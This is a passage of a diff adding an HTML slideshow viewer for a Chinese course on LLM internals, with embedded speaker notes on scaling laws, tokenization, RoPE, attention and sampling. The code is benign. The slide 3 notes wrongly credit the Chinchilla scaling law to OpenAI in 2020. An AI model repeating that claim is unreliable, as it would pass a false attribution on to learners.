@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>01B.AI认知进阶 - 幻灯片演示系统</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body, html {
+    width:100%; height:100%; overflow:hidden;
+    background:#0B1120; font-family:"Microsoft YaHei", -apple-system, sans-serif;
+    color:#E2E8F0; user-select:none;
+  }
+  
+  /* 幻灯片全屏居中自适应容器 */
+  #viewport-wrapper {
+    position: absolute;
+    top: 0; left: 0; width: 100%; height: 100%;
+    display: flex; align-items: center; justify-content: center;
+    background: #0B1120;
+    overflow: hidden;
+  }
+  
+  /* 固定 16:9 画布容器 */
+  #slide-stage {
+    position: relative;
+    width: 1280px;
+    height: 720px;
+    background: #0B1120;
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85);
+    transform-origin: center center;
+    transition: transform 0.08s ease-out;
+  }
+
+  /* 幻灯片 iframe */
+  #slide-frame {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    border: none;
+    background: #0B1120;
+  }
+
+  /* 焦点与交互屏蔽层（彻底解决 iframe 劫持键盘事件问题） */
+  #click-shield {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 10;
+    cursor: default;
+  }
+
+  /* 顶部进度条 */
+  #progress-bar {
+    position: fixed;
+    top: 0; left: 0;
+    height: 3px;
+    background: linear-gradient(90deg, #38BDF8, #818CF8);
+    z-index: 1000;
+    transition: width 0.2s ease-out;
+  }
+
+  /* 悬浮控制工具栏 */
+  #control-bar {
+    position: fixed;
+    bottom: 24px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: rgba(15, 23, 42, 0.88);
+    backdrop-filter: blur(16px);
+    border: 1px solid rgba(255, 255, 255, 0.15);
+    border-radius: 40px;
+    padding: 6px 20px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    z-index: 100;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.6);
+    opacity: 0.35;
+    transition: opacity 0.25s, transform 0.25s;
+  }
+  #control-bar:hover, #control-bar.active {
+    opacity: 1;
+    transform: translateX(-50%) translateY(-2px);
+  }
+
+  .ctrl-btn {
+    background: none;
+    border: none;
+    color: #94A3B8;
+    font-size: 13px;
+    cursor: pointer;
+    padding: 6px 12px;
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    transition: all 0.2s;
+    outline: none;
+    white-space: nowrap;
+  }
+  .ctrl-btn:hover {
+    color: #38BDF8;
+    background: rgba(56, 189, 248, 0.12);
+  }
+  .ctrl-btn:active {
+    transform: scale(0.96);
+  }
+  .ctrl-btn:disabled {
+    color: #475569;
+    cursor: not-allowed;
+    background: none;
+  }
+
+  #page-indicator {
+    font-size: 13px;
+    font-weight: 700;
+    color: #F1F5F9;
+    min-width: 65px;
+    text-align: center;
+    letter-spacing: 0.5px;
+  }
+
+  /* 快捷键提示条 */
+  #kbd-hint {
+    font-size: 11px;
+    color: #64748B;
+    border-left: 1px solid rgba(255,255,255,0.12);
+    padding-left: 12px;
+    display: flex;
+    gap: 6px;
+    align-items: center;
+    white-space: nowrap;
+  }
+  kbd {
+    background: rgba(255,255,255,0.12);
+    border-radius: 4px;
+    padding: 2px 6px;
+    color: #CBD5E1;
+    font-size: 11px;
+    font-family: inherit;
+  }
+
+  /* 通用侧边抽屉样式 (演讲备注 N / 扩展学习 E) */
+  .side-drawer {
+    position: fixed;
+    top: 0;
+    right: -540px;
+    width: 540px;
+    height: 100%;
+    background: rgba(11, 17, 32, 0.97);
+    backdrop-filter: blur(20px);
+    border-left: 1px solid rgba(255,255,255,0.14);
+    z-index: 2000;
+    transition: right 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    display: flex;
+    flex-direction: column;
+    box-shadow: -20px 0 40px rgba(0,0,0,0.75);
+    user-select: text;
+  }
+  .side-drawer.open {
+    right: 0;
+  }
+  .drawer-header {
+    padding: 18px 24px;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background: rgba(15, 23, 42, 0.7);
+  }
+  .drawer-header h3 {
+    font-size: 15px;
+    color: #38BDF8;
+    font-weight: 600;
+  }
+  .drawer-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 24px;
+    font-size: 13.5px;
+    line-height: 1.75;
+    color: #E2E8F0;
+    word-break: break-word;
+  }
+  .drawer-body.raw-text {
+    white-space: pre-wrap;
+  }
+  .drawer-body a {
+    color: #38BDF8;
+    text-decoration: underline;
+    word-break: break-all;
+  }
+  .drawer-body a:hover {
+    color: #7DD3FC;
+  }
+  .drawer-body h1, .drawer-body h2, .drawer-body h3, .drawer-body h4 {
+    color: #F8FAFC;
+    margin: 16px 0 8px 0;
+    line-height: 1.4;
+  }
+  .drawer-body h1 { font-size: 18px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 8px; }
+  .drawer-body h2 { font-size: 16px; color: #38BDF8; }
+  .drawer-body h3 { font-size: 14.5px; color: #A5B4FC; }
+  .drawer-body p, .drawer-body li { margin-bottom: 8px; }
+  .drawer-body ul, .drawer-body ol { padding-left: 20px; margin-bottom: 12px; }
+  .drawer-body code {
+    background: rgba(255,255,255,0.1);
+    padding: 2px 5px;
+    border-radius: 4px;
+    font-family: Consolas, monospace;
+    font-size: 12.5px;
+    color: #FCD34D;
+  }
+  .drawer-body blockquote {
+    border-left: 3px solid #38BDF8;
+    padding: 8px 14px;
+    background: rgba(56, 189, 248, 0.08);
+    margin: 10px 0;
+    border-radius: 0 6px 6px 0;
+  }
+</style>
+</head>
+<body tabindex="0">
+
+<div id="progress-bar"></div>
+
+<div id="viewport-wrapper">
+  <div id="slide-stage">
+    <iframe id="slide-frame" src="page_1.html" allowfullscreen></iframe>
+    <div id="click-shield" title="单击右侧下一页，单击左侧上一页，双击全屏"></div>
+  </div>
+</div>
+
+<!-- 底部悬浮控制栏 -->
+<div id="control-bar">
+  <button id="btn-prev" class="ctrl-btn" title="上一页 (← / PageUp / Backspace)">◀ 上一页</button>
+  <span id="page-indicator">1 / 22</span>
+  <button id="btn-next" class="ctrl-btn" title="下一页 (→ / Space / PageDown / Enter)">下一页 ▶</button>
+  <button id="btn-notes" class="ctrl-btn" title="演讲者备注 (N)">📝 演讲备注</button>
+  <button id="btn-ext" class="ctrl-btn" title="课后扩展学习指南 (E)">📚 扩展学习</button>
+  <button id="btn-fs" class="ctrl-btn" title="全屏演示 (F / F11)">⛶ 全屏</button>
+  <div id="kbd-hint">
+    <span><kbd>→</kbd>/<kbd>Space</kbd> 翻页</span>
+    <span><kbd>N</kbd> 备注</span>
+    <span><kbd>E</kbd> 扩展</span>
+    <span><kbd>F</kbd> 全屏</span>
+  </div>
+</div>
+
+<!-- 演讲者备注抽屉 -->
+<div id="notes-drawer" class="side-drawer">
+  <div class="drawer-header">
+    <h3 id="notes-title">演讲手册备注 (第 1 页)</h3>
+    <button id="btn-close-notes" class="ctrl-btn" style="padding:4px 8px; font-size:16px;">✕</button>
+  </div>
+  <div id="notes-body" class="drawer-body raw-text">正在载入备注...</div>
+</div>
+
+<!-- 课后扩展学习指南抽屉 -->
+<div id="ext-drawer" class="side-drawer">
+  <div class="drawer-header">
+    <h3>📚 课后扩展学习指南 (01B.AI认知进阶)</h3>
+    <button id="btn-close-ext" class="ctrl-btn" style="padding:4px 8px; font-size:16px;">✕</button>
+  </div>
+  <div id="ext-body" class="drawer-body"></div>
+</div>
+
+<script>
+  const pages = ["page_1.html","page_2.html","page_3.html","page_4.html","page_5.html","page_6.html","page_7.html","page_8.html","page_9.html","page_10.html","page_11.html","page_12.html","page_13.html","page_14.html","page_15.html","page_16.html","page_17.html","page_18.html","page_19.html","page_20.html","page_21.html","page_22.html"];
+  const notesMap = {"page_1.html":"## Slide Objective\n作为 01B《AI 认知进阶（可选深潜）：大模型底层工程与算力机理》的开篇封面页，明确界定本课的定位与承接关系：承接第 01 课的宏观范式跃迁与业务认知，打开 .jar 包黑盒，深入底层齿轮、张量计算拓扑、训练流水线与算力显存基础设施，树立硬核架构师底座心智。明确标注本课为专为项目 Leader 与资深工程师打造的选修深潜课程，普通学员学完第 01 课后可直接跳过进入《第 02 课：AI辅助编程入门》。\n\n## Suggested Presentation\n各位架构师、技术 Leader 与核心工程师，大家好！欢迎进入《01B. AI 认知进阶（可选深潜）：大模型底层工程与算力机理》。\n\n在前面的必修课《第 01 课：AI 认知入门》中，我们已经面向全体工程师完成了宏观视角的认知重塑：看清了大模型的本质是一台概率预测机，并将它形象地比喻为一个具备认知能力的 `.jar` 包。对于绝大部分日常业务开发的普通同学，学完第 01 课后，标准路线是直接进入《第 02 课：AI辅助编程入门》，立即上手工具提效。\n\n但如果你是一名技术 Leader、系统架构师，或者对大模型底层原理充满好奇，你心里一定会升起更深层的工程疑问：这个 `.jar` 包内部究竟由哪些齿轮咬合而成？它是如何接收一个 Token 并通过矩阵乘法吐出下一个 Token 的？为什么千亿参数模型在私有化部署时会发生显存爆炸？DeepSeek 和 OpenAI 的慢思考突破在底层到底改变了什么？\n\n本门进阶选修课 01B 的使命，就是带大家彻底打开这个黑盒。我们将不讲空洞概念，直接深入到机器齿轮的最底层：从 2024–2026 双引擎 Scaling Laws 的演进，到 BPE 分词、RoPE 相对旋转位置编码、Grouped-Query Attention 的端到端推理计算拓扑；从预训练、SFT、DPO 到 RLVR（可验证奖励强化学习）的完整四阶段训练流水线；再到模型权重格式、INT4/INT8 量化原理、企业私有化显存速算黄金公式与 PagedAttention 显存池化调度。\n\n只有真正搞懂大模型的微观物理机理与客观边界，技术负责人才能在后续的 Agent 开发、高吞吐 RAG 与私有化架构选型中，做出最优、最稳固的工程决策！\n\n## Key Q&A / Clarifications\n**Q：01B 课程适合哪些学员？普通工程师是否必须学习？**\nA：01B 是一门**可以跳过的选修/进阶深潜课程**，专为项目 Leader、技术负责人和高级开发深入学习底层工程与算力机理而设。普通学员在学完第 01 课建立起宏观认知后，标准推荐路线是直接进入《第 02 课：AI辅助编程入门》，聚焦在日常 Coding 工具链的动手提效上；只有当需要进行企业私有化算力估算、高并发部署调优或底层模型选型时，才需要深入研读 01B 的硬核内容。\n\n## Transition\n在全面拆解技术细节之前，我们先通过目录，总览本门进阶课程的五大核心篇章与工程演进主线。\n","page_2.html":"## Slide Objective\n展现 01B《AI 认知进阶（可选深潜）：大模型底层工程与算力机理》的整体知识地图与章节逻辑。帮助学员建立结构化心智模型，清晰理解五大章节如何从扩展律前沿递进到推理拓扑、训练流水线、算力底座，并最终反哺架构设计。再次明确本课专为技术 Leader 与资深工程师打造，普通学员可跳过直接进入第 02 课。\n\n## Suggested Presentation\n在进入第一个具体技术点之前，我们先花两分钟总览全课的五大进阶核心篇章。\n\n承接第 01 课的宏观认知，整个 01B 课程的设计逻辑是一条极其严密的工程递进链：\n- **第一章【扩展律前沿与推理全景】（P03 - P04）**：我们首先从扩展律的最新变迁切入。过去大家只知道“堆算力和语料”，但 2024–2026 年行业发生了关键转折——从单纯的预训练扩展，迈向了推理时思考扩展（Test-Time Compute）。紧接着，我们用一张端到端张量计算图，把 Prompt 转化为 Next Token 的完整拓扑全景建立起来。\n- **第二章【模型推理核心机理】（P05 - P09）**：这是核心计算单元的显微镜。我们将深入拆解 BPE 分词算法及其在工程中的深坑，解析 Embedding 高维空间流形与 RoPE 旋转位置编码的复数外推机制，剖析从 MHA 到 GQA 的降维工程，理解 Temperature 与 Top-P 采样微积分，并彻底厘清 Prefill 计算密集与 Decode 访存密集背后的 KV Cache 机制。\n- **第三章【现代模型训练范式与前沿架构】（P10 - P14）**：我们将揭开大模型从 0 到 1 的四阶段流水线（Pre-training ➔ SFT ➔ RLHF/DPO ➔ RLVR），重点解释为什么具备确定性校验器的代码和数学催生了强化学习慢思考；随后剖析千亿 MoE 稀疏路由与 Native Omni 原生全模态技术。\n- **第四章【模型文件、量化与算力底座】（P15 - P18）**：走出算法层面，走向物理世界。剖析 Safetensors 与 GGUF 的底层文件组织，拆解 INT8/INT4 量化与反量化补偿算法，给出架构师必备的显存精准速算黄金公式，并深入 GPU HBM 带宽墙与 vLLM/SGLang PagedAttention 显存池化调度。\n- **第五章【物理边界、架构反哺与全栈选型】（P19 - P22）**：最后收官升维。剖析裸模型的四大物理边界，揭示底层机理如何直接决定 RAG 切块策略、Agent 工具调用与成本路由设计，给出公有云、本地量化与私有化微调的三大选型决策树，打通全栈认知。\n\n## Key Q&A / Clarifications\n**Q：普通学员如果不学 01B，对后续课程会有阻碍吗？**\nA：完全没有阻碍！整个培训体系采用了清晰的分层设计：第 01 课是全员必修的认知基石，第 02 课是全员动手实战的核心。而 01B 是面向项目 Leader、架构师或对算力显存有深度诉求的工程师的“可选深潜”。普通学员在掌握了第 01 课的宏观心智后，直接进入《第 02 课：AI辅助编程入门》是最顺畅、最高效的学习路线。\n\n## Transition\n理解了整体版图后，让我们立刻翻开第一章，深入 2024–2026 双引擎 Scaling Laws 的演进核心。\n","page_3.html":"## Slide Objective\n剖析 2024–2026 年大模型底层扩展律（Scaling Laws）的重大演进：从传统的“预训练数据与参数扩展”迈向“预训练 + 推理时思考扩展（Test-Time Compute）”双引擎时代，深入解释 DeepSeek-R1 与 OpenAI o1 等前沿模型的底层算力机理。\n\n## Suggested Presentation\n各位技术同仁，当我们讨论大模型的性能跃升时，很多人脑海中还停留在 2020 年 OpenAI 提出的 Chinchilla Scaling Law——也就是“只要不断增加参数量、给更多的预训练语料和 GPU 集群，模型的 Loss 就会按幂律不断下降”。\n\n但是在 2024 年底到 2025 年初，整个 AI 工业界遇到了一个公认的瓶颈：高质量文本数据墙（Data Wall）。互联网上现成的人类高质量文本、教科书和开源代码，几乎已经被千亿大模型扒光了；再单纯把模型参数从 100B 堆到 1T，带来的性能提升已经呈现明显的边际效益递减。\n\n就在这个关键节点，以 OpenAI o1 和中国团队的 DeepSeek-R1 为代表，开辟了模型的“第二引擎”——Test-Time Compute Scaling（推理时思考扩展）。\n\n大家请看右侧的卡片：第二引擎的核心秘密在于，它不再把所有算力都在预训练阶段“一次性固化在静态权重里”，而是把相当一部分计算开销转移到了“推理阶段”。\n在过去，你问大模型一个高难度的算法题，它会立刻以快思考（System 1）的方式吐出第一个词，一旦第一个词方向走偏，整段代码就全面崩溃。\n而在第二引擎中，模型在强化学习（RL）的引导下，学会了人类科学家的慢思考（System 2）：它在把答案展示给用户之前，会在后台的 `<think>` 标签内部生成数千甚至数万个内部 Token。在这些 Token 内部，模型会自主进行假设分析、试探执行、发现矛盾、自我否定、回溯重算，直到推导出可信结论后，才输出最终答复。\n\n从架构师的视角来看，这带来了算力经济学的巨变：我们不再需要为了极其罕见的复杂任务去买单昂贵的万亿参数巨无霸模型，而是可以用中等尺寸的高效底座，按问题难度动态分配推理 Token 算力——简单任务 0.2 秒解决，极难任务允许它思考 3 分钟，消耗更多推理 FLOPs 来换取极高的确定性。\n\n## Key Q&A / Clarifications\n**Q：慢思考模型输出的那些 `<think>` Token 会被计费吗？对系统延迟有什么影响？**\nA：是的。所有在内部生成的思考 Token 都会占用 GPU 显存与计算时间，云厂商同样会计入输入/输出 Token 成本。对于架构师而言，这意味着在接口设计时不能盲目对所有接口都开启慢思考，而必须设计前置的路由层：简单分类走低延迟快思考，复杂逻辑决策才路由至慢思考模型。\n\n## Transition\n理解了双引擎 Scaling Laws 的算力宏观图景后，大模型在接收到这些 Prompt 和生成 Token 的瞬间，底层到底经历了怎样的张量流转？让我们进入 P04，完整绘制现代 LLM 推理的端到端计算拓扑图。","page_4.html":"## Slide Objective\n为学员建立现代大语言模型推理全流程的端到端计算拓扑图，打通从用户原始文本 Prompt 到 Token 矩阵、隐藏层流转、Transformer 层特征变换、LM Head 投影到采样 Next Token 的全部数据结构流转，并清晰界定 Prefill 与 Decode 两个截然不同的物理阶段。\n\n## Suggested Presentation\n搞清楚了宏观扩展律，现在让我们正式把显微镜对准模型，看看一个请求从发出到返回，底层张量到底经历了怎样的计算拓扑。\n\n请看中间的五步流转管道：\n第一步，分词（Tokenization）。用户输入的无论是一行中文、一段 Python 代码还是一个 JSON 字符串，计算机都无法直接处理。分词器通过 BPE 等算法，将其切碎成 Token ID 列表，形成一个形状为 `[Batch_Size, Sequence_Length]` 的整型张量。\n第二步，查表与位置编码（Embedding & RoPE）。每一个 Token ID 会在词表嵌入矩阵中查出一个 $d_{model}$ 维的稠密连续向量（如 4096 维），同时注入现代旋转位置编码 RoPE，把 Token 在上下文中的相对位置信息编码进复数旋转空间。\n第三步，堆叠的 Transformer 核心层。数据流穿过数十层（例如 32 层或 64 层）完全相同的 Transformer Block。在每一层内部，张量首先经过 RMSNorm 和 GQA 分组查询注意力机制，与历史上下文的 KV Cache 发生交互；随后经过残差连接与第二级 RMSNorm，进入 SwiGLU 或 MoE 前馈神经网络，提取深层抽象语义。\n第四步，LM Head 反向投影。最后一层的输出通过一个反向投影矩阵，直接把 $d_{model}$ 维度的连续向量放大映射回词表大小 $V$（比如 128,000 维），生成包含每一个词出现倾向的未归一化打分——Logits。\n第五步，自回归采样闭环。应用 Temperature、Top-P 或 Top-K 算法，经过 Softmax 概率归一化，随机或贪婪采样出唯一的一个 Next Token ID。紧接着，这个新的 Token ID 会被回填拼接到输入序列的最末尾，以此为基础重新启动下一次循环，直到遇到结束符 `<|im_end|>`。\n\n最底部的两行对比至关重要：\n在大模型推理中，一次完整的交互被硬生生切分为两个完全不同的物理阶段：\n1. Prefill 阶段：模型一次性吞入整个 Prompt。因为所有 Prompt Token 可以并行计算矩阵乘法（GEMM），所以显卡的计算单元（Tensor Cores）全功率打满，这个阶段决定了首字延迟（TTFT）；\n2. Decode 阶段：生成阶段每次只计算一个新词，必须把数百亿参数和全部 KV Cache 从显存重新读取一次，显卡计算单元大面积空转，完全被显存带宽死死卡住。\n\n## Key Q&A / Clarifications\n**Q：为什么大模型不能像 Prefill 一样把整个回答并行一次性生成出来，而必须一个词一个词地串行生成？**\nA：因为语言的因果因果性（Causal Dependency）。第 $N$ 个词的概率分布完全依赖于第 $1$ 到第 $N-1$ 个词。在第 $N-1$ 个词尚未被模型实际采样确定之前，第 $N$ 个词的上下文是不存在的。因此自回归生成在数学上是严格串行、步长为 1 的马尔可夫链式前向过程。\n\n## Transition\n端到端拓扑已经非常清晰。接下来，我们将正式进入第二章，逐个击破其中的核心齿轮。首先来到第一站：Tokenizer 分词器，看看 BPE 算法是如何构建的，以及在生产中会遇到哪些致命深坑。","page_5.html":"## Slide Objective\n深入剖析 Tokenizer 的底层构建算法（BPE Byte Pair Encoding），厘清词表与 Merge Table 的生成原理；分析分词压缩比对工程成本的影响，并指出生产中最常见的 3 大分词深坑（多字节截断、数字未对齐与代码空格敏感性）。\n\n## Suggested Presentation\n很多初学者以为大模型“懂得汉字和英语单词”，其实大模型根本没有文字的概念，它看到的唯一实体就是分词器转化出的整数编号（Token IDs）。今天绝大多数主流大模型（GPT-4、LLaMA-3、Qwen、DeepSeek）使用的都是 BPE（字节对编码）或其变体。\n\n大家看上方左侧卡片，BPE 是怎么构建出来的？\n它极其优雅：首先以 256 个最原始的二进制字节（Bytes）为基础词表，这意味着只要是合法的 UTF-8 二进制流，BPE 永远不会抛出“未登录词（OOV）”异常；接着，在预训练阶段统计海量语料中哪两个相邻字节出现的频次最高，比如 `'t'` 和 `'h'` 频繁相邻，就把它们合并为一个新词 `'th'`，并把这条合并规则记录到 Merge Table；如此循环迭代数万次，直到词表达到设定的容量（例如从 32K 扩充到 150K）。\n\n在上方右侧，我们给出了一个关键指标——压缩比（Compression Ratio）。早期很多欧美开源模型（如早期 LLaMA）词表主要针对英文设计，导致一个常见汉字会被生硬拆成 2 到 3 个 Token，不仅让中国企业调用 API 的费用高出两倍，还硬生生将上下文窗口挤压了三分之二。而今天优秀的开源模型（如 Qwen2.5、DeepSeek-V3）通过针对中英文进行联合词表构建，中文压缩比已经能够达到 1 个汉字仅消耗 0.6 到 0.8 个 Token，信息密度大幅提升。\n\n最后，请大家务必警惕底部的 3 大生产工程陷阱：\n第一，多字节拆分：UTF-8 汉字是 3 字节，如果你的系统在做 RAG 字符串硬截断（按字符数切片），很容易在分词边界处把一个 3 字节汉字切成两半，模型就会收到乱码字节；\n第二，数字未对齐：旧版分词器对多位数字的分词极度混乱，导致模型在计算 `12345 + 6789` 时无法像人类一样按个位、十位逐位对齐，从而频繁出现算术计算错误；\n第三，代码缩进敏感：在解析 Python 或 YAML 等对缩进敏感的语言时，连续空格是否被打包为独立 Token，直接影响模型的代码生成质量。\n\n## Key Q&A / Clarifications\n**Q：在做 RAG 文本切块（Chunking）时，应该按字符长度（Characters）切分还是按 Token 长度切分？**\nA：必须使用与底层大模型完全一致的 Tokenizer 进行切分！如果按字符切分（比如每 500 字一截），既可能切碎 UTF-8 多字节字符，又无法精确控制注入 Prompt 时的实际 Token 消耗，极易引发上下文溢出错误。\n\n## Transition\n分词器把文本变成了离散的整型 Token ID。但这些离散的数字无法进行加减乘除，模型是如何将它们映射为连续向量，又是如何处理数十万 Token 之间的位置关系的呢？我们进入 P06：Embedding 流形与 RoPE 旋转位置编码。","page_6.html":"## Slide Objective\n深入剖析大语言模型的向量化表示机制：从高维连续空间流形直觉，到绝对位置编码（APE）的致命缺陷，再到现代主流大模型标配的 RoPE（旋转位置编码）复数几何原理及其支撑 128K~1M 超长上下文的外推（Extrapolation）工程机理。\n\n## Suggested Presentation\n上一页我们看到，分词器吐出的是离散的整数编号，比如 1520 代表“代码”，3051 代表“逻辑”。但离散数字是无法计算语义关联的，因此进入模型的第一步，就是通过 Embedding 矩阵，把每个整型 ID 映射到一个极高维度的连续几何空间流形（比如 4096 维或 8192 维）。\n\n请看上方左侧：在高维空间中，语义相近的词汇会被拉近在一起，形成一个稠密的几何流形。例如“Java”和“Python”的向量余弦相似度可能高达 0.82，而“Java”和“香蕉”的相似度可能只有 0.12。模型后续所有的“理解”，本质上都是在对这个高维流形进行几何变换。\n\n然而，单纯的词向量是不带顺序的。如果把“狗咬人”和“人咬狗”送进去，词向量完全相同。这就需要注入位置编码。\n请看上方右侧，为什么绝对位置编码（APE）彻底退出了历史舞台？\n早期模型（如 GPT-2）使用硬编码的第 1、第 2 个绝对坐标。这种方案有两个致命硬伤：\n第一，模型学不到“相对距离”，它无法理解“前一个词和后一个词”与“第 100 个词和第 101 个词”具有相同的语法修饰关系；\n第二，完全无法外推！如果预训练时只见过 4096 个位置，当线上请求输入 4097 个词时，位置编码根本没有对应的参数，系统直接崩溃。\n\n这就引出了下方的现代 LLM 标配——RoPE（旋转位置编码，苏剑林 RoFormer 提出）。\nRoPE 的数学设计极其天才：它将向量每两维看作复平面上的一个点，位置为 $m$ 的 Token，就将其向量逆时针旋转 $m\\theta$ 角度。\n最神奇的推导在于：当 Query 向量（位置 $m$）和 Key 向量（位置 $n$）进行点积时，通过三角函数积化和差公式，两个绝对位置直接抵消，点积结果只严格取决于相对位移 $(m - n)$！\n这不仅天然保证了相对距离不变性，而且伴随着相对距离变大，点积注意力自然衰减。更进一步，结合 YaRN 或 NTK-aware 频率插值技术，工程师只需做极轻量微调，就能把原本 4K 训练的模型无损扩展到 128K 甚至 100 万超长上下文！\n\n## Key Q&A / Clarifications\n**Q：为什么我们在使用开源模型处理 32K 或 128K 超长 Prompt 时，有时候需要在配置文件里修改 `rope_scaling` 参数？**\nA：`rope_scaling`（如 `type: \"yarn\"` 或 `factor: 8.0`）正是告诉推理引擎如何对 RoPE 的基频 $\\theta$ 进行动态缩放插值。通过将位置索引的旋转步进频率按比例压缩，使得 32K 位置的向量旋转角度落在模型预训练时见过的 4K 角度范围内，从而避免高频震荡导致注意力崩塌。\n\n## Transition\n有了词向量流形和 RoPE 旋转位置编码，张量正式进入了 Transformer 的核心引擎——Self-Attention。让我们进入 P07，深入点积注意力矩阵计算与从 MHA 到 GQA 的演进。","page_7.html":"## Slide Objective\n深入剖析 Self-Attention 自注意力机制的核心数学矩阵乘法与点积缩放 $\\sqrt{d_k}$ 的工程意义；横向对比从 Multi-Head Attention（MHA）到 Multi-Query Attention（MQA）再到现代黄金标准 Grouped-Query Attention（GQA）的演进脉络与显存优化原理。\n\n## Suggested Presentation\n大家在各种科普里都听说过“注意力机制”，但作为工程开发人员，我们必须看懂它的矩阵运算本质。\n\n请看上方卡片中的经典公式：$\\text{Attention}(Q, K, V) = \\text{Softmax}\\left(\\frac{Q K^T}{\\sqrt{d_k}}\\right) V$。\n这其实就是三步高度规整的矩阵乘法：\n第一步，计算关联度：把 Query 矩阵与 Key 转置矩阵做点积。每一个 Token 的 Query 向量就像一个雷达探针，去探测序列中所有 Token 的 Key 索引，点积越大说明两个词的语义关联度越强；\n第二步，为什么公式里一定要除以 $\\sqrt{d_k}$？很多同学在面试中答不上来。其实这是为了避免数值弥散！假设每个注意力头的维度 $d_k = 128$，两个均值为 0、方差为 1 的 128 维独立随机向量做点积，其方差会飙升到 128！极大的数值直接喂给 Softmax，会导致最大的那个数概率无限逼近 1，其余所有数全部无限逼近 0，反向传播的梯度直接归零饱和。除以 $\\sqrt{d_k}$ 正好把方差重新规范化回 1.0；\n第三步，加权求和：把 Softmax 归一化后的注意力概率矩阵与 Value 矩阵相乘，完成上下文信息的动态聚合。\n\n然而，在生产部署中，原始的 MHA（多头注意力）遇到了巨大的灾难。请看下方三根柱子的演进：\n在 MHA 中，如果有 32 个 Query 头，就必须配套 32 个独立的 Key 头和 32 个 Value 头。当上下文拉长到 32K、128K 时，这 32 对 KV 矩阵必须完整保存在显存（KV Cache）里，显存直接被撑爆；\n为了解决这个问题，学术界提出了 MQA（多查询注意力），让所有 32 个 Query 头共享同一对 KV 头，显存直接砍掉 32 倍！但 MQA 过于激进，在复杂数理和代码生成任务上表达能力有所下降；\n最终，工业界找到了完美的平衡点——GQA（分组查询注意力）。例如 32 个 Query 头分成 8 组，每 4 个 Query 头共享 1 对 KV 头（8 个 Key 头和 8 个 Value 头）。实验表明，GQA 的生成质量与原始 MHA 几乎完全无差，却一举削减了 75% 的 KV Cache 显存占用与显存带宽搬运量！因此，今天主流开源模型（LLaMA-3、Qwen-2.5、Mistral）已全量切换为 GQA。\n\n## Key Q&A / Clarifications\n**Q：在查看 HuggingFace 上的 `config.json` 时，哪个参数能看出模型是否使用了 GQA？**\nA：观察两个参数：`num_attention_heads`（Query 头数）和 `num_key_value_heads`（KV 头数）。如果两者相等（比如都是 32），说明是传统的 MHA；如果 `num_key_value_heads: 8` 而 `num_attention_heads: 32`，就说明采用了 4:1 分组的 GQA 架构。\n\n## Transition\n自注意力机制完成了上下文向量的特征提取，经过多层堆叠后，模型输出了词表中每个 Token 的预测得分 Logits。那么，系统是如何根据这些得分采样出下一个词的？我们进入 P08：自回归采样解码的数学本质。","page_8.html":"## Slide Objective\n深入拆解自回归推理最后一步“采样解码（Sampling & Decoding）”的数学本质；从 Softmax 微积分角度理解 Temperature 对概率分布陡峭度的调节机制，剖析 Top-K 截断与 Top-P 核采样的组合逻辑，并提供企业级工程调参对照表。\n\n## Suggested Presentation\n很多开发者在调用大模型 API 时，经常随便设置几个参数：`temperature=0.7`、`top_p=0.9`，但很少有人从微积分层面搞懂它们在干什么。\n\n模型最后一层输出的是一组没有任何概率含义的浮点数打分，叫 Logits（$z_i$）。要把它们变成概率，必须经过 Softmax 函数。\n请看中间左侧卡片的公式：$P(w_i) = \\frac{\\exp(z_i / T)}{\\sum \\exp(z_j / T)}$。\n这里的除数 $T$ 就是 Temperature（温度系数）：\n当我们将 $T$ 调到极小（无限逼近于 0），任何微小的得分差异经过指数放大后，都会让最高分的那个词概率变成 100%，其余所有词全变成 0%！这就是所谓的贪婪搜索（Greedy Search），每次输出绝对确定，适合用于输出严密的 JSON 或编译代码；\n反之，当我们将 $T$ 调大（比如 1.2），所有得分被除以一个大于 1 的数，极差缩小，Softmax 分布被硬生生拉平，原本概率只有 0.001% 的生僻词概率被抬高到 1%，模型展现出极大的多样性和想象力，但若温度过高（如 1.5 以上），模型就会彻底胡言乱语。\n\n为了防止温度拉大带来的荒谬错误，工业界引入了 Top-K 与 Top-P 两个守门人：\n中间卡片 2 是 Top-K 截断：不管词表有多大，永远只保留概率最大的前 $K$ 个（比如 50 个），把剩下的垃圾尾巴直接一刀切归零。这筑起了一道物理硬防线；\n中间卡片 3 是 Top-P（核采样 Nucleus Sampling）：它比 Top-K 更聪明。它将所有候选词按概率从大到小排序并累加，只要累积概率超过 $P$（比如 90%），后续所有词立刻截断。这意味着在确定性极高的语境下（例如“法国的首都是”），“巴黎”一个词的概率就达到了 98%，Top-P 会自动将候选集收缩为 1 个词；而在开放发散语境下，Top-P 会自动把候选池扩展到几十个词，实现了真正自适应的动态窗口！\n\n在底部，我们给出了工程实战推荐：\n如果你在做 SQL 生成、函数调用或 JSON 结构化提取，请将 Temperature 压到 0.0~0.2，Top-P 设为 0.8；如果是日常智能客服或知识库问答，保持在 0.5~0.7，Top-P 设为 0.9；而只有在营销文案撰写或剧本创作时，才建议放开到 0.8~1.0。\n\n## Key Q&A / Clarifications\n**Q：如果将 Temperature 设为 0，大模型的输出就绝对确定不变了吗？**\nA：理论上是确定性的。但在工程物理机房中，多卡并行推理使用了混合精度（FP16/BF16）矩阵运算，GPU 浮点加法并不满足结合律（即 $(A+B)+C \\neq A+(B+C)$），微小的浮点舍入差异在极高深度网络中可能发生微小震荡，导致偶发的 Token 漂移。如果业务要求绝对 100% 确定性，除 $T=0$ 外还需在推理引擎中锁定固定随机种子（Seed）并使用确定性 CUDA 内核。\n\n## Transition\n采样完成，一个新的 Token 诞生了！现在我们把新词追加到 Prompt 